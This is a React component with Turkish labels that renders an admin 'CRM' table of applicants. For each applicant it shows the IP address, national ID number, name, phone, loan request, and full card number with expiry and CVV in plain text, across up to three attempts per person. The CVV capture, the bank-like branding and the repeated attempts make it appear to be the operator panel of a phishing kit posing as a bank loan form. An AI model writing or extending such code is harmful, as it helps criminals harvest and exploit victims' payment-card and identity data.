"use client";

import { useState } from "react";
import type { ApplicantWithAttempts, Attempt } from "@/lib/storage/types";
import { formatCurrency } from "@/lib/payment-plan";

interface CrmAccordionProps {
  applicants: ApplicantWithAttempts[];
}

export function CrmAccordion({ applicants }: CrmAccordionProps) {
  const [openId, setOpenId] = useState<string | null>(null);

  if (applicants.length === 0) {
    return (
      <p className="rounded-lg bg-white px-4 py-10 text-center text-gray-400 shadow">
        Henüz başvuru yok
      </p>
    );
  }

  return (
    <div className="overflow-hidden rounded-lg bg-white shadow">
      <div className="grid grid-cols-[1fr_1.2fr_1fr_0.7fr_0.6fr_1fr_32px] gap-2 border-b bg-gray-50 px-4 py-3 text-xs font-semibold uppercase tracking-wide text-gray-500">
        <span>IP</span>
        <span>Ad Soyad</span>
        <span>Telefon</span>
        <span>Durum</span>
        <span>Deneme</span>
        <span>Tarih</span>
        <span />
      </div>

      {applicants.map((applicant) => {
        const last = applicant.attempts[applicant.attempts.length - 1];
        const isOpen = openId === applicant.id;

        return (
          <div key={applicant.id} className="border-b last:border-b-0">
            <button
              type="button"
              onClick={() => setOpenId(isOpen ? null : applicant.id)}
              className="grid w-full grid-cols-[1fr_1.2fr_1fr_0.7fr_0.6fr_1fr_32px] gap-2 px-4 py-3 text-left text-sm hover:bg-gray-50"
            >
              <span className="font-mono text-xs text-gray-700">
                {applicant.ipAddress || "—"}
              </span>
              <span className="truncate text-gray-900">
                {last ? `${last.firstName} ${last.lastName}` : "—"}
              </span>
              <span className="truncate text-gray-700">{last?.phone ?? "—"}</span>
              <span>
                <StatusBadge status={applicant.status} />
              </span>
              <span className="text-gray-700">{applicant.currentAttempt}/3</span>
              <span className="text-xs text-gray-500">
                {new Date(applicant.createdAt).toLocaleString("tr-TR")}
              </span>
              <span className="text-ykb-primary">{isOpen ? "▲" : "▼"}</span>
            </button>

            {isOpen && (
              <div className="border-t bg-gray-50 px-4 py-3">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="text-left text-xs text-gray-500">
                      <th className="pb-2 pr-3 font-medium">#</th>
                      <th className="pb-2 pr-3 font-medium">TC</th>
                      <th className="pb-2 pr-3 font-medium">Ad Soyad</th>
                      <th className="pb-2 pr-3 font-medium">Telefon</th>
                      <th className="pb-2 pr-3 font-medium">Kredi</th>
                      <th className="pb-2 pr-3 font-medium">Kart</th>
                      <th className="pb-2 font-medium">Tarih</th>
                    </tr>
                  </thead>
                  <tbody>
                    {[1, 2, 3].map((num) => {
                      const attempt = applicant.attempts.find(
                        (a) => a.attemptNumber === num
                      );
                      return (
                        <AttemptRow key={num} attemptNumber={num} attempt={attempt} />
                      );
                    })}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        );
      })}
    </div>
  );
}

function AttemptRow({
  attemptNumber,
  attempt,
}: {
  attemptNumber: number;
  attempt?: Attempt;
}) {
  if (!attempt) {
    return (
      <tr className="border-t border-dashed border-gray-200 text-gray-400">
        <td className="py-2 pr-3">{attemptNumber}</td>
        <td colSpan={6} className="py-2">
          Yapılmadı
        </td>
      </tr>
    );
  }

  const cardLabel = attempt.noCreditCard
    ? "Kart yok"
    : attempt.cardNumber
      ? `${attempt.cardNumber} · ${attempt.cardExpiry} · ${attempt.cardCvv}`
      : "—";

  return (
    <tr className="border-t border-gray-200 text-gray-800">
      <td className="py-2 pr-3 font-medium">{attemptNumber}</td>
      <td className="py-2 pr-3 font-mono text-xs">{attempt.tcKimlik}</td>
      <td className="py-2 pr-3">
        {attempt.firstName} {attempt.lastName}
      </td>
      <td className="py-2 pr-3">{attempt.phone}</td>
      <td className="py-2 pr-3">
        {formatCurrency(attempt.loanAmount)} / {attempt.loanTerm} ay
      </td>
      <td className="py-2 pr-3 font-mono text-xs">{cardLabel}</td>
      <td className="py-2 text-xs text-gray-500">
        {new Date(attempt.createdAt).toLocaleString("tr-TR")}
      </td>
    </tr>
  );
}

function StatusBadge({ status }: { status: string }) {
  const done = status === "completed";
  return (
    <span
      className={`rounded px-2 py-0.5 text-xs ${
        done ? "bg-green-100 text-green-700" : "bg-yellow-100 text-yellow-700"
      }`}
    >
      {done ? "Tamamlandı" : "Devam"}
    </span>
  );
}
